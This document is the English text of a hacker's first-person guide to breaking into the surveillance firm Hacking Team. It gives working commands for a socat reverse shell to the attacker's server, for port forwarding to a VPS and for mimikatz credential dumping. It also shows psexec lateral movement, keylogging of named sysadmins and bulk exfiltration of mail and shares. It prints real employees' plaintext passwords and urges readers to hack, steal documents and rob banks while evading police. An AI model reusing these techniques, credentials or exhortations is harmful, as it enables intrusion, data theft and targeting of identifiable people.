
HackingTeam渗透过程

----[ 1 - Introduction ]------------------------

Note the change in language since the last issue [1]. The
English-speaking worlds already has books, talks, guides, and all
sorts of information about hacking. There are a lot of hackers in that
world who are better than I am, but disgracefully fritter away their
knowledge working as "defence" contractors, for intelligence agencies,
protecting banks and corporations and defending the established order.
Hacker culture in the EU originated as a counterculture, but all
that's left of that origin is the aesthetic -- everything else has
been assimilated. At least they get to wear a T-shirt, dye their hair
blue, use hacker handles, and feel like rebels while they work for the
system.

There was once a time when you had to break into an office building to
exfiltrate documents [2]. You used to need a gun to rob a bank. These
days you can do it all from bed with a laptop in your hands [3][4].
Like the CNT once said about the Gamma Group hack: "we should move
forward with these new forms of struggle" [5]. Hacking is a powerful
tool. Learn it and join the fight!

'''
[1] http://pastebin.com/raw.php?i=cRYvK4jb
[2] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
[3] http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-15092108
3914167.html
[4] https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf 
[5] http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-
gamma-group
'''
----[ 2 - Hacking Team ]----------------------------

Hacking Team was a company that helped governments to hack and spy
on journalists, activists, the political opposition, and other threads
to their power [1][2][3][4][5][6][7][8][9][10][11] -- as well as,
every now and then, criminals and terrorists [12]. Vincenzetti, the
CEO, liked to end his emails with the fascist slogan "boia chi molla".
He was, more precisely, a "boia chi vende RCS". All the while, he
claimed to have the technology to solve the "Tor problem" and the
"darknet problem" [13]. But since I've been able to maintain my
freedom, I have my doubts about how effective that technology is.

'''
[1] http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/
[2] http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html
[3] http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/
[4] https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/
[5] https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/
[6] https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/
[7] http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/
[8] http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal
[9] https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/
[10] http://www.wired.com/2013/06/spy-tool-sold-to-governments/
[11] http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/
[12] http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html
[13] http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web
'''

----[ 3 - Be careful out there ]---------------------

Sadly, our world is upside-down. You get richer by doing bad things,
and get locked up for doing good things. Fortunately, thanks to the
hard work of people like those in the "Tor Project" [1], you can avoid
getting yourself locked up by following a few simple guidelines:

1) Encrypt your hard drive [2]

I assume that by the time the police come to impound your computer,
you've already made many mistakes, but an ounce of prevention is
worth a pound of cure.

2) Use a virtual machine and route all your traffic through Tor

This achieves two things. First, all of your connections are
anonymized through the Tor network. Second, keeping your personal
life and your anonymous life on different computers helps you avoid
mixing them up by accident.

You can protect yourself with Whonix [3], Tails [4], Qubes TorVM
[5], or something personalized [6]. You can find a detailed
comparison here [7].

3) (Optional) Don't connect to the Tor network directly

Tor is not a panacea. It's possible to correlate the times at which
your connected to Tor with the times during which your hacker
handle is active. There have also been attacks using the Tor exit
node [8]. You can connect to the network using other people's wifi.
Wifislax [9] is a linux distro with many tools for procuring wifi.
Another option is to connect to a VPN or a bridge node [10] before
connecting to Tor, but this is less secure because it is possible
to correlate the hacker's activity with the internet activity
coming from your house (this was used as evidence against Jeremy
Hammond, for example [11]).

The reality is that while Tor is not perfect, it works well enough.
When I was young and reckless, I did a lot of things without any
protection (I'm talking about hacking, here) apart from Tor, and
which the police were still incapable of investigating, and I never
had any problems.

'''
[1] https://www.torproject.org/
[2] https://info.securityinabox.org/es/chapter-4
[3] https://www.whonix.org/
[4] https://tails.boum.org/
[5] https://www.qubes-os.org/doc/privacy/torvm/
[6] https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy
[7] https://www.whonix.org/wiki/Comparison_with_Others
[8] https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/
[9] http://www.wifislax.com/
[10] https://www.torproject.org/docs/bridges.html.en
[11] http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html
'''

----[ 3.1 - Infrastructure ]---------------------------------------

I don't hack directly from the Tor exit nodes. They're on blacklists,
go very slowly, and cannot receive reverse connections. Tor serves to
protect my anonymity while I connect to the infrastructure I use for
hacking, which consists of:

1) Domain names

to give directions to command and control (C&C), and for setting up
DNS tunnels for secure exfiltration.

2) Stable server

to serve as C&C servers for receiving reverse shells, as a place to
launch attacks from, and a place to stash the loot.

3) Hacked servers

these serve as pivots behind which I hide the IP addresses of
stables servers, and for when I want a quick connection without
a pivot -- for portscanning, for example, or scanning the entire
internet, or downloading a database through sql injection, etc.

Obviously you have pay anonymously, with bitcoin, for exaple (if you
use it carefully).

----[ 3.2 - Accountability ]----------------------------------------

In the news we often see attacks attributed to groups of governmental
hackers ('APTs'), because they always use the same tools, leave the
same footprints, and even use the same infrastructure (domains,
emails, etc.). They're negligent because they free to hack without any
legal consequences.

I didn't want to make it too easy for the police to link what I did to
Hacking Team, with its hacks and handles, with my day-to-day work
as a blackhat hacker. So I used new servers and domains, registered
with new email accounts, and payed with new bitcoin. And I only used
tools which were either publically available, or which I had written
specifically for this attack, and I changed my style of doing things
so as to not leave my usual forensic footprint.

----[ 4 - Gathering information ]--------------------
Though it might be tedious, this step is very important, since the
larger the attack surface, the easier it will be to find a weakness
in it, somewhere.

----[ 4.1 - Technical Information ]--------------------------------

Some of the tools and techniques include:

1) Google

You can find a lot of unexpected things with a couple well-chosen
search queries. The identity of DPR, for example [1]. The bible on
how to use google for hacking is the book, "Google Hacking for
Penetration Testers" [2].

2) Enumeration of subdomains

A business's main domain is usually supplied by a third party, and
you're going to find a range of IP addresses belonging to
subdomains like mx.company.com, ns1.company.com, etc. And sometimes
there are things in 'hidden' subdomains that should not be exposed.
Tools useful for discovering domains are subdomains include fierce
[3], theHarvester [4], and recon-ng [5].

3) Whois queries and inverse queries

With an inverse query using a domain's whois information or a
business's IP range, you can find other domains and IP ranges
belonging to them. As far as I know, there's no free way of making
inverse whois queries, except for a google 'hack':

"via della moscova 13" site:www.findip-address.com
"via della moscova 13" site:domaintools.com

4) Portscanning and fingerprinting

Apart from the other techniques, you can talk to the business's
employees. I include it in this section because it isn't an attack,
just a means of obtaining information. The business's IDS might
generate an alert upon detecting a portscan, but you don't have to
worry about that. The entire internet is scanning itself
constantly.

For scanning, nmap [6] is precise, and can fingerprint most of the
services it discovers. For businesses with large IP ranges, zmap
[7] or masscan [8] are fast. WhatWeb [9] and BlindElephant [10] can
fingerprint websites.

[1] http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html
[2] http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf
[3] http://ha.ckers.org/fierce/
[4] https://github.com/laramies/theHarvester
[5] https://bitbucket.org/LaNMaSteR53/recon-ng
[6] https://nmap.org/
[7] https://zmap.io/
[8] https://github.com/robertdavidgraham/masscan
[9] http://www.morningstarsecurity.com/research/whatweb
[10] http://blindelephant.sourceforge.net/

----[ 4.2 - Social information ]-------------------------------------

For social engineering, it's very useful to gather information about
the employees, their roles, contract information, operating system,
nagivator, plugins, software, etc. Some resources include:

1) Google

Here's the most useful tool, again.

2) theHarvester y recon-ng

I've mentioned these already in the last section, but they have
much more functionality. You can find a lot of information quickly
and automatically. It's worth the trouble to read all the
documentation.

3) LinkedIn

You can find a lot of information about the employees here. The
businesses' recruiters will be the ones most inclined to talk.

4) Data.com

Previously known as jigsaw. They have contact information for many
employees.

5) File metadata

You can find a lot of information about employees and their system
in the metadata of files that the business has published. Some
handy tools for finding files on a business's website and
extracting metadata are metagoofil [1] and FOCA [2].

[1] https://github.com/laramies/metagoofil
[2] https://www.elevenpaths.com/es/labstools/foca-2/index.html

----[ 5 - Entering the Network ]-------------------------------------

There are various ways to make an entrance. Since the method used for
Hacking Team is less common and more trouble than is ordinarily
necessary, I'm going to talk a bit about more common methods, which I
recommend attempting first.

----[ 5.1 - Social engineering ]-------------------------------------

Social engineering, and specifically spear phishing, is responsible
for the majority of hacks these days. For an introduction in Spanish,
see [1]. For more information in English, see [2] (the third part,
"Targeted Attacks"). For entertaining anecdotes about social
engineering in the past, see [3]. I didn't want to try spear phishing
against Hacking Team, since their business is in helping
governments spear phish their opposition. There was therefore a much
greater risk of Hacking Team recognizing and investigating said
attempts.

[1] http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html
[2] http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/
[3] http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf

----[ 5.2 - Buying access ]------------------------------------------

Thanks to the hardworking Russians and their exploit kits, traffic
trafickers, and bot farms, many businesses already have compromised
machines in their network. Almost all of the Fortune 500, with their
enormous networks, have a few bots on the inside. That said, Hacking
Team is a very small business, most of whose employees are experts in
information security, and so there was very little probability that
they had already been compromised.

----[ 5.3 - Technical exploitation ]---------------------------------

After the Gamma Group hack, I discovered a process for searching for
vulnerabilities [1]. Hacking Team has the public IP range:

inetnum: 93.62.139.32 - 93.62.139.47
descr: HT public subnet

Hacking Team had a small exposure to the internet. For example, unlike
the Gamma Group, their public-facing site required the client to have
a certificate in order to connect. It contained a main website (a
Joomla blog, for which Joomscan [2] revealed no serious
vulnerabilities), a mail server, a couple of routers, two VPN systems,
and a spam-filtering system. And so I had three options: to try to
find a 0day in Joomla, a 0day in postfix, or a 0day in one of the
embedded systems. A 0day in an embedded system seemed to me to be the
most tenable option, and after about two weeks of reverse engineering,
I discovered a remote root exploit. Since the vulnerabilities it
relies on haven't yet been patched, I'm not going to give any more
details on it. For more information on how to search for this type of
vulnerability, see [3] and [4].

[1] http://pastebin.com/raw.php?i=cRYvK4jb
[2] http://sourceforge.net/projects/joomscan/
[3] http://www.devttys0.com/
[4] https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A

----[ 6 - Be prepared ]----------------------------------------------

I did a lot of work and testing before using the exploit against
Hacking Team. I wrote a firmware with a backdoor, and compiled various
post-exploitation tools for the embedded system. The backdoor served
to protect the exploit. Using the exploit just once and then returning
thorugh the back door made the work of discovering and patching
vulnerabilities more difficult.

The post-exploitation tools I had prepared were:

1) busybox

for all the common Unix utilities that the system didn't have.

2) nmap

for scanning and fingerprinting Hacking Team's internal network.

3) Responder.py

the most useful tool for attacking Windows when you have access to
the internal network but don't have a user account.

4) Python

for executing Responder.py.

5) tcpdump

for sniffing traffic.

6) dsniff

for snooping passwords from vulnerable protocols like ftp, and for
arpspoofing. I'd rather have used ettercap, writen by Hacking
Team's own ALoR and NaGA, but it was difficult to compile for the
system.

7) socat

for a handy pty shell:

my_server: socat file: tty, raw, echo=0, tcp-listen:mi_port
hacked_system: socat exec:'bash -li',pty,stderr,setsid,sigint,\
sane tcp:my_server:my_port

And for many other things. It's a network swiss army knife. See the
examples section of its documentation.

8) screen

like socat's pty, not strictly necessary, but I wanted to feel at
home in Hacking Team's network.

9) a SOCKS proxy server

to use together with proxychains for accessing the internal network
with this or that other programme.

10) tgcd

for forwarding ports, like those of the SOCKS server, through the
firewall.

[1] https://www.busybox.net/
[2] https://nmap.org/
[3] https://github.com/SpiderLabs/Responder
[4] https://github.com/bendmorris/static-python
[5] http://www.tcpdump.org/
[6] http://www.monkey.org/~dugsong/dsniff/
[7] http://www.dest-unreach.org/socat/
[8] https://www.gnu.org/software/screen/
[9] http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html
[10] http://tgcd.sourceforge.net/

The worst thing that could happen would be that my backdoor or
post-exploit tools would make the system unstable, and force an
employee to investigate. So I spent a week testing my exploit,
backdoor, and post-exploit tools in the networks of other vulnerable
businesses before entering Hacking Team network.

----[ 7 - Watch and listen ]----------------------------------------

Now that I was inside the internal network, I wanted to take a look
around and think about my next step. Switching Responder.py to
analysis mode (-A, to listen without sending poisoned responses), and
performed a slow scan with nmap.

----[ 8 - NoSQL databases ]-----------------------------------------

NoSQL, or rather NoAuthentication, has been a great gift to the hacker
community [1]. Just when I was worrying that all MySQL's sins of
omission had finally been patched [2][3][4][5], these new databases
appear, lacking authentication by design. Nmap found a few in Hacking
Team's internal network:

27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 47547
|   totalSize = 49856643072
...
|_    version = 2.6.5

27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 31987
|   totalSize = 33540800512
|   databases
...
|_    version = 2.6.5

These were databases for RCS test instances. The audio that RCS
captures is held in a MongoDB with GridFS. This is where the audio
folder in the torrent [6] came from. They had inadvertantly spied on
themselves.

[1] https://www.shodan.io/search?query=product%3Amongodb
[2] https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
[3] http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html
[4] http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c
[5] http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html
[6] https://ht.transparencytoolkit.org/audio/

----[ 9 - Crossed wires ]-------------------------------------------

As fun as it was to listen to captures and watch webcam images of
Hacking Team developing its malware, it wasn't very useful. Their
insecure security backups were the vulnerability that threw the doors
open. According to the documentation [1], their iSCSI systems should
have been on a separate network, but nmap count a few of them in their
192.168.1.200/24 subnet:
...
3260/tcp open iscsi?
| iscsi-info:
| Target: iqn.2000-01.com.synology:ht-synology.name
| Address: 192.168.200.66:3260,0
|_ Authentication: No authentication required

Nmap scan report for synology-backup.hackingteam.local (192.168.200.72)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000-01.com.synology:synology-backup.name
|     Address: 10.0.1.72:3260,0
|     Address: 192.168.200.72:3260,0
|_    Authentication: No authentication required

iSCSI requires a kernel module, and it would have been difficult to
compile it for the embedded system. I forwarded the port so that I
could mount it from a VPS:

VPS: tgcd -L -p 3260 -q 42838
Sistema embebida: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838

VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1

iSCSI now finds the name iqn.2000-01.com.synology, but has some
problems mounting it since it now believes that its address is both
192.168.200.72 and 127.0.0.1.

The to solve this is:

iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1

and then:

iscsiadm -m node --targetname=iqn.2000-01.com.synology:synology-backup.name -p 192.168.200.72 --login

...and the archive system appears! We mount it:

vmfs-fuse -o ro /dev/sdb1 /mnt/tmp

and find secure backups of various virtual machines. The Exchange
server seems like the most interesting. It's too big to download, but
we can mount it remotely and search for interesting archives:

$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk
$ fdisk -l /dev/loop0
/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFAT

entonces el offset es 2048 * 512 = 1048576
$ losetup -o 1048576 /dev/loop1 /dev/loop0
$ mount -o ro /dev/loop1 /mnt/exchange/

and now in /mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14
172311 we find the hard drive of the virtual machine, and mount it:

vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/
mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1

...and, finally, we have gotten to the centre of the matryoshka doll
and we can see all of the archives of the old Exchange server on
/mnt/part1.

[1] https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/Infras
trutturaIT/Rete/infrastruttura%20ht.pdf

----[10 - From secure backups to domain admin ]---------------------

What interested me most in the secure backup was trying to find a
password or hash that I could use to access the actual server. I used
pwdump, cachedump, and lsadump [1] with the registry backups. lsdadump
found a password for the besadmin service account:

_SC_BlackBerry MDS Connection Service
0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........

I used proxychains [2] with the socks server in the embedded system
and smbclient [3] to check the password:

proxychains smbclient '//192.168.100.51/c$' -U 'hackingteam.local/besadmin%bes32678!!!'
It worked! The besadmin password was still valid, and was a local
admin. I used my proxy and metasploit's psexec_psh [4] to gain a
meterpreter session. I migrated to a 64-bit process, "load kiwi [5],
and "creds_wdigest", and by now had a number of passwords, including
the domain admin's:

HACKINGTEAM  BESAdmin       bes32678!!!
HACKINGTEAM  Administrator  uu8dd8ndd12!
HACKINGTEAM  c.pozzi        P4ssword      <---- look! the sysadmin!
HACKINGTEAM  m.romeo        ioLK/(90
HACKINGTEAM  l.guerra       4luc@=.=
HACKINGTEAM  d.martinez     W4tudul3sp
HACKINGTEAM  g.russo        GCBr0s0705!
HACKINGTEAM  a.scarafile    Cd4432996111
HACKINGTEAM  r.viscardi     Ht2015!
HACKINGTEAM  a.mino         A!e$$andra
HACKINGTEAM  m.bettini      Ettore&Bella0314
HACKINGTEAM  m.luppi        Blackou7
HACKINGTEAM  s.gallucci     1S9i8m4o!
HACKINGTEAM  d.milan        set!dob66
HACKINGTEAM  w.furlan       Blu3.B3rry!
HACKINGTEAM  d.romualdi     Rd13136f@#
HACKINGTEAM  l.invernizzi   L0r3nz0123!
HACKINGTEAM  e.ciceri       2O2571&2E
HACKINGTEAM  e.rabe         erab@4HT!

[1] https://github.com/Neohapsis/creddump7
[2] http://proxychains.sourceforge.net/
[3] https://www.samba.org/
[4] http://ns2.elhacker.net/timofonica/manuales/Manual_de_Metasploit_Unleashed.pdf
[5] https://github.com/gentilkiwi/mimikatz

--[ 11 - Downloading the mail ]----------------------

Now that I had the password to the domain's admin, I had access to the
email, the hard of the business. Since every password I used raised
the risk of being detected, I download the emails before going on to
explore them. Powershell makes this easy [1]. Curiously, I found a bug
in the way that dates were handled. After obtaining the emails, I
waited a couple of weeks before getting the source code and all the
rest, returning once in a while to download new emails. The server was
Italian, with dates in the format day/month/year. I used:

-ContentFilter {(Received -ge '05/06/2015') -or (Sent -ge '05/06/2015')}

with New-MailboxExportRequest to download the new mails (in this case
all the mails from June 5th onward). The problem was that it said that
the date is invalid if the day is greater than 12 (imagine that this
is because the month is usually put first in the EU, and the month
can't be greater than 12). It seems that the engineers at Microsoft
had only tested their software on their own regional configuration.

[1] http://www.stevieg.org/2010/07/using-the-exchange-2010-sp1-mailbox-export-features-for-mass-exports-to-pst/

--[ 12 - Downloading archives ]----------------------

Now that I was the domain's admin, I started downloading the shared
resources using my proxy and smbclient's -Tc option. For example:

proxychains smbclient '//192.168.1.230/FAE DiskStation' \
-U 'HACKINGTEAM/Administrator%uu8dd8ndd12!' -Tc FAE_DiskStation.tar '*'

This is where the Amministrazione, FAE DiskStation, and FileServer
folders in the torrent came from.

--[ 13 - Introduction to hacking a Windows domain ]-----

I'd like to take a break from the story of these fuckers [weones
culiaos], to share a bit of knowledge about attacking Windows
networks.

--[ 13.1 - Lateral movement ]---------------------------
I'm going to give a quick review of the techniques used for spreading
out inside a Windows network. The techniques for remote execution
require a local administrator's password or hash to work. Often, the
most common way of obtaining these credentials is to use mimikatz [1],
and above all sekurlsa::logonpasswords and sekurlsa::msv, from the
machines you already have administrative access to. The techniques for
moving around "in situ" also require administrative privileges (except
for runas). The most important tools for
privilege escalation are PowerUp [2], and bypassuac [3].

[1] https://adsecurity.org/?page_id=1821
[2] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
[3] https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Invoke-BypassUAC.ps1

Remote navigation:

1) psexec

The tried and tested way of navigating Windows networks. You can
use psexec [1], winexe [2], metasploit's psexec_psh [3], powershell
empire's invoke_psexec [4], or the Windows command "sc" [5]. For
the metasploit module, powershell empire, and pth-winexe [6], it's
enough to know the hash without knowing the password. This is the
most universal way (it works on any computer with port 445 open),
but it is also the least cautious. Events of type 7045 "Service
Control Manager" will appear in the registry. In my experience,
this has never tipped anyone off during a hack, but it's something
they might notice afterwards, and it might help the investigators
figure out what the hacker was doing.

2) WMI

The most cautious method. The WMI service is enabled on all Windows
computers, except for servers, where the firewall blocks it by
default. You can use wmiexec.py [7], pth-wmis [6] (you can find a
demo of wmiexec and pth-wmis here [8]), powershell empires's
invoke_wmi, or the Windows command, wmic [5]. Aside from wmic, the
rest of these require only the hash.

3) PSRemoting [10]

This is disabled by default, and I don't advise enabling new
protocols unless you have you. But if the sysadmin has already
enabled it, it's very convenient, especially if you use powershell
for everything (and yes, you should use powershell for almost
everything; this may change [11] with powershell 5 and Windows 10,
but right now powershell makes it easy to do everything in RAM,
dodge the antivirus, and leave few footprints).

4) Programmed tasks

You can execute programmes remotely with at and schtasks [5]. They
work in the same situations as psexec, and likewise leave some
known footprints [12].

5) GPO

If all of those protocols are disabled or blocked by the firewall,
once you are the administrator of the domain, you can use GPO to
give it a logon script, install an msi, execute a programmed task
[13], or as we will see with computer of Mauro Romeo (Hacking
Team's sysadmin), enable WMI and open the firewall through GPO.

[1] https://technet.microsoft.com/en-us/sysinternals/psexec.aspx
[2] https://sourceforge.net/projects/winexe/
[3] https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh
[4] http://www.powershellempire.com/?page_id=523
[5] http://blog.cobaltstrike.com/2014/04/30/lateral-movement-with-high-latency-
cc/
[6] https://github.com/byt3bl33d3r/pth-toolkit
[7] https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py
[8] https://www.trustedsec.com/june-2015/no_psexec_needed/
[9] http://www.powershellempire.com/?page_id=124
[10] http://www.maquinasvirtuales.eu/ejecucion-remota-con-powershell/
[11] https://adsecurity.org/?p=2277
[12] https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems
[13] https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/lateral_movement/new_gpo_immediate_task.py

Navigation 'in situ':

1) Impersonating tokens

Once you have administrative access to a computer, you can use
other users' tokens to access the domain's resources. Two tools for
doing this are incognito [1] and the token::* commands in mimikatz
[2].

2) MS14-068

You can take advantage of a validation vulnerability in Kerberos to
generate a domain administrator ticket [3][4][5].

3) Pass the Hash

If you have your has but the user does not have an active session,
you can use sekurlsa:pth [2] to obtain a user ticket.

4) Process injection

Any RAT can be injected into another process -- the migrate command
in meterpreter and pupy [6], for example, or psinject [7] in
powershell empire. You can inject the process that has the token
that you want.

5) runas

This sometimes turns out to be very useful because it doesn't
require admin privileges. The command is part of Windows, but if
you dont' have the graphical interface, you can use powershell
[8].

[1] https://www.indetectables.net/viewtopic.php?p=211165
[2] https://adsecurity.org/?page_id=1821
[3] https://github.com/bidord/pykek
[4] https://adsecurity.org/?p=676
[5] http://www.hackplayers.com/2014/12/CVE-2014-6324-como-validarse-con-cualquier-usuario-como-admin.html
[6] https://github.com/n1nj4sec/pupy
[7] http://www.powershellempire.com/?page_id=273
[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1

----[ 13.2 - Persistence ]------------------------------------------

Once you have gained access, you want to maintain it. Persistence is
really only a challenge for sons of bitches [hijos de puta] like the
ones in Hacking Team, who want to hack activists or other individuals.
When you're hacking businesses, you don't need persistence because the
business never sleeps. The only 'persistence' I use is in duqu 2's
sense, executing in the RAM of a couple of servers with high rates of
uptime. In the hypothetical case that everything is reset at once, I
have passwords and a golden ticket [1] set aside. You can read more
information about persistence mechanisms for Windows here [2][3][4].
But for hacking businesses, you don't need it, and it raises the risk
of detection.

[1] http://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-t
icket-howto/
[2] http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-e
mpire/
[3] http://www.hexacorn.com/blog/category/autostart-persistence/
[4] https://blog.netspi.com/tag/persistence/

----[ 13.3 - Internal reconnaissance ]------------------------------

The best tool these days for understanding Windows networks is
Powerview [1]. It's worth the trouble to read everything by the author
[2], and above all [3], [4], [5], and [6]. Powershell is, again, very
powerful [7]. But since there are still many 2003 and 2000 servers
without powershell, you should also look the old school way [8], with
tools like netview.exe [9] or the windows "new view" command. Other
techniques that I like are:

1) Download a list archive numbers

With the domain administrator account, you can download all the
archive numbers in the network with powerview:

Inqvoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |
select-string '^(.*) \t-' | %{dir -recurse $_.Matches[0].Groups[1]
| select fullname | out-file -append files.txt}

You can then read it at your leisure later on, and choose the ones
that you want to download.

2) Read emails

As we have already seen, you can download emails with powershell,
and obtain a lot of useful information.

3) Read sharepoint

This is another place where many businesses have important
information. You can download it with powershell [10].

4) Active Directory [11]

It holds a lot of useful information about users and computers.
Without being the domain admin, you can already find a great deal
of information with powerview and other tools [12]. After becoming
the domain admin, you should export all the information from AD
using csvde or some other tools.

5) Spy on the employees

One of my favourite passtimes is stalk the sysadmins. By spying on
Christian Pozzi (Hacking Team's sysadmin), I gained access to the
Nagios server, which gave me access to the 'rete sviluppo' (the
development network with the RCS source code). With a simple
combination of PowerSploit's Get-Keystrokes and Get-TimedScreenshot
[13], nishang's Do-Exfiltration, and GPO, I could spy on any
employee I wanted, or even the entire domain.

[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
[2] http://www.harmj0y.net/blog/tag/powerview/
[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/
[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/
[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/
[6] http://www.slideshare.net/harmj0y/i-have-the-powerview
[7] https://adsecurity.org/?p=2535
[8] https://www.youtube.com/watch?v=rpwrKhgMd7E
[9] https://github.com/mubix/netview
[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-bulk-downloads-of-files-in-sharepoint/
[11] https://adsecurity.org/?page_id=41
[12] http://www.darkoperator.com/?tag=Active+Directory
[13] https://github.com/PowerShellMafia/PowerSploit
[14] https://github.com/samratashok/nishang

----[ 14 - Stalking sysadmins ]-------------------------------------

Reading the infrastructure's documentation [1], I learned that I still
lacked access to something important -- the 'Rete Sviluppo', an
isolated network that held the source code of RCS. The sysadmins of a
business always have access to everything. I searched through Mauro
Romeo and Christian Pozzi's computers to see how they accessed the
rete sviluppo, and to see if they had other interesting systems that I
should investigate. It was easy to access their computers, since they
were part of the Windows domain that I had adminstrative control over.
Muro Romeo's computer didn't have an open port, so I opened the WMI
port [2] so that I could execute meterpreter [3]. Besides collecting
keystrokes and screencaps with Get-Keystrokes and Get-TimedScreenshot,
I used a lot of metasploit's /gather/ modules, CredMan.ps1 [4], and I
searched the archives [5]. I saw that Pozzi had a Truecrypt volume,
and waited for him to mount it so that I could copy an archive of it.
A lot of people have had a good laugh at Christian Pozzi's weak
passwords (and at Christian Pozzi in general, who offered plenty of
material for comedy [6][7][8][9]). I included them in the dump for a
laugh, and to show how clueless he is. The reality is that mimikatz
and keyloggers got all the passwords as well.

[1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/
[2] http://www.hammer-software.com/wmigphowto.shtml
[3] https://www.trustedsec.com/june-2015/no_psexec_needed/
[4] https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde
[5] http://pwnwiki.io/#!presence/windows/find_files.md
[6] http://archive.is/TbaPy
[7] http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/
[8] http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt
[9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/

----[ 15 - The bridge ]---------------------------------------------

Inside Christian Pozzi's encrypted volume, there was a textfile with a
number of passwords [1]. One of those was for a Fully Automated Nagios
server, which had access to the sviluppo network so that it could
monitor it. I had found the bridge. I only had the password for the
web interface, but I had a public exploit [2] to execute code and
obtain a shell (it's an unauthenticated exploit, but needs a user to
have already initiated a session, using one of the passwords in the
textfile).

[1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt
[2] http://seclists.org/fulldisclosure/2014/Oct/78

----[ 16 - Reusing and resetting passwords ]------------------------

Reading the emails, I saw Daniele Milan granting access to the git
repositories. I already had his Windows password, thanks to mimikatz.
I tried it on the git server, and it worked. I tried it with sudo, and
it worked. For the gitlab server, and his twitter account, I used the
'I forgot my password' function, and accessed the mail server to reset
the password.

----[ 17 - Conclusion ]---------------------------------------------

That's it. It's that easy to overthrow an enterprise and put a stop
its human rights abuses. That is the beauty and the asymmetry of
hacking: with just one hundred hours of work, one person can undo
years of work by a multi-million-dollar enterprise. Hacking gives us
the dispossessed the ability to fight and win.

Hacking guides usually end with a warning: This information is solely
for educational purposes. Be an ethical hacker. Do not attack
computers without permission. Blah, blah, blah. I'm going to say the
same thing, but with a more rebellious conception of 'ethical'
hacking. Ethical hacking means exfiltrating documents, expropriating
money from the banks, and protecting the computers of the common
people. However, most of the people who call themselves 'ethical
hackers' work only to protect the ones that pay their consulting fees,
and so they usually end up being mercenaries more than hackers.

